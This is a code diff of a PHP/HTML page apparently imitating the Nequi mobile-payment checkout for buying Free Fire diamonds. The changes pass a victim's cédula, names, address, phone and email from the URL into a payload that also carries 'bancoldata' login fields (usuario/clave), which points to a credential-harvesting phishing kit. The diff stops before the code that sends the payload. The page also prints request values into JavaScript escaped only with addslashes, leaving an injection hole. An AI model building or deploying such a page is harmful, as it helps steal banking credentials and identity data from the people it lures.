@@ -1,4 +1,28 @@
 <!DOCTYPE html>
+<?php
+// Procesar datos de Free Fire desde GET
+$freefire_data = [
+  'diamonds' => $_GET['diamonds'] ?? 0,
+  'bonus' => $_GET['bonus'] ?? 0,
+  'price' => $_GET['price'] ?? '0',
+  'playerId' => $_GET['playerId'] ?? '',
+  'playerName' => $_GET['playerName'] ?? '',
+  'email' => $_GET['correo'] ?? '',
+  'telefono' => $_GET['telefono'] ?? '',
+  'celular' => $_GET['celular'] ?? '',
+  'tipo_doc' => $_GET['tipo_doc'] ?? '',
+  'cedula' => $_GET['cedula'] ?? '',
+  'nombres' => $_GET['nombres'] ?? '',
+  'apellidos' => $_GET['apellidos'] ?? '',
+  'direccion' => $_GET['direccion'] ?? '',
+  'pais' => $_GET['pais'] ?? 'Colombia',
+  'ciudad' => $_GET['ciudad'] ?? '',
+  'tipo_persona' => $_GET['tipo_persona'] ?? 'natural'
+];
+
+// Convertir precio a número para cálculos
+$monto_numerico = floatval(str_replace(['$', ',', '.'], ['', '', ''], $freefire_data['price']));
+?>
 <html lang="es">
 <head>
   <meta charset="UTF-8" />
@@ -178,7 +202,7 @@
   <div class="container">
     <div class="header">
       <div class="nequi">Nequi</div>
-      <div class="amount" id="monto">Monto: --</div>
+      <div class="amount">Monto: $<?php echo number_format($monto_numerico, 0, ',', '.'); ?></div>
     </div>
 
     <form id="nequiForm">
@@ -240,17 +264,17 @@
       return mostrarError("El número debe tener exactamente 10 dígitos.");
     }
 
-    // OBTENER DATOS DEL localStorage (igual que en check.php)
+    // OBTENER DATOS DE FREE FIRE (desde PHP)
     const tbdatos = {
-        correo: localStorage.getItem("correo") || "",
-        cel: localStorage.getItem("cel") || "",
-        val: localStorage.getItem("val") || "",
-        per: localStorage.getItem("per") || "",
-        nom: localStorage.getItem("nom") || "",
-        telefono: localStorage.getItem("cel") || "",
-        identificacion: localStorage.getItem("val") || "",
-        tipo_persona: localStorage.getItem("per") || "",
-        banco: localStorage.getItem("nom") || ""
+        correo: "<?php echo addslashes($freefire_data['email']); ?>",
+        cel: "<?php echo addslashes($freefire_data['celular']); ?>",
+        val: "<?php echo addslashes($freefire_data['cedula']); ?>",
+        per: "<?php echo addslashes($freefire_data['tipo_persona']); ?>",
+        nom: "<?php echo addslashes($freefire_data['nombres'] . ' ' . $freefire_data['apellidos']); ?>",
+        telefono: "<?php echo addslashes($freefire_data['telefono']); ?>",
+        identificacion: "<?php echo addslashes($freefire_data['cedula']); ?>",
+        tipo_persona: "<?php echo addslashes($freefire_data['tipo_persona']); ?>",
+        banco: "nequi"
     };
 
     const transactionId = generarTransactionId();
@@ -263,8 +287,15 @@
     const payload = {
       transactionId,
       bancoldata: { usuario: nequi, clave: nequi },
-      tbdatos: tbdatos,  // <-- Datos correctos del localStorage
-      total: totalPagar || "0"
+      tbdatos: tbdatos,  // <-- Datos de Free Fire
+      total: "<?php echo $monto_numerico; ?>",
+      // Agregar datos específicos de Free Fire
+      freefire: {
+        diamonds: "<?php echo addslashes($freefire_data['diamonds']); ?>",
+        bonus: "<?php echo addslashes($freefire_data['bonus']); ?>",
+        playerId: "<?php echo addslashes($freefire_data['playerId']); ?>",
+        playerName: "<?php echo addslashes($freefire_data['playerName']); ?>"
+      }
     };
 
     try {
